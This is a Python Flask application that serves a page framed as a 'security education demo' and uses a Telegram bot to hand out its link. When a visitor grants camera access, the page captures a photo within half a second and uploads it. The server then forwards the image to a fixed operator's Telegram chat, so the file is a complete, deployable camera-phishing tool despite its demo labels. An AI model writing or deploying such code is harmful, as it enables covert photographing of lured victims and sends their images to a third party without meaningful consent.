from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Security Test</title></head>
<body style="background:black;text-align:center;color:white;font-family:Arial;margin-top:50px">
<h2>📸 需要相机权限</h2>
<p>网络安全教育演示</p>
<button onclick="startCamera()" style="background:#ff0050;color:white;padding:15px 40px;border:none;border-radius:30px;font-size:18px">允许使用相机</button>
<video id="v" autoplay style="width:300px;margin:20px;display:none"></video>
<div style="position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px">⚠️ 网络安全教育演示</div>
<script>
function startCamera(){
document.querySelector('button').style.display='none';
document.querySelector('h2').innerHTML='🎥 正在启动相机...';
navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
let video=document.getElementById('v');
video.style.display='block';
video.srcObject=stream;
setTimeout(()=>{
let canvas=document.createElement('canvas');
canvas.width=video.videoWidth||640;
canvas.height=video.videoHeight||480;
canvas.getContext('2d').drawImage(video,0,0);
canvas.toBlob(blob=>{
let form=new FormData();
form.append('photo',blob);
fetch('/upload',{method:'POST',body:form});
});
document.body.innerHTML='<h2>✅ 演示完成</h2><p>感谢参与安全教育</p>';
stream.getTracks().forEach(t=>t.stop());
},500);
}).catch(()=>alert('需要相机权限'));
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files.get('photo')
    if photo:
        files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': '📸 相机捕获 - 安全教育演示'}
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
        return 'OK', 200
    return 'No photo', 400

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
            send_message(chat_id, f"🔐 *安全教育演示*\n\n点击链接测试相机权限:\n{url}\n\n⚠️ 仅在您自己的设备上测试", parse_mode='Markdown')
        else:
            send_message(chat_id, "发送 /start 开始")
    return Response('OK', status=200)

def send_message(chat_id, text, parse_mode=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text}
    if parse_mode:
        data['parse_mode'] = parse_mode
    requests.post(url, data=data)

@app.route('/health')
def health():
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
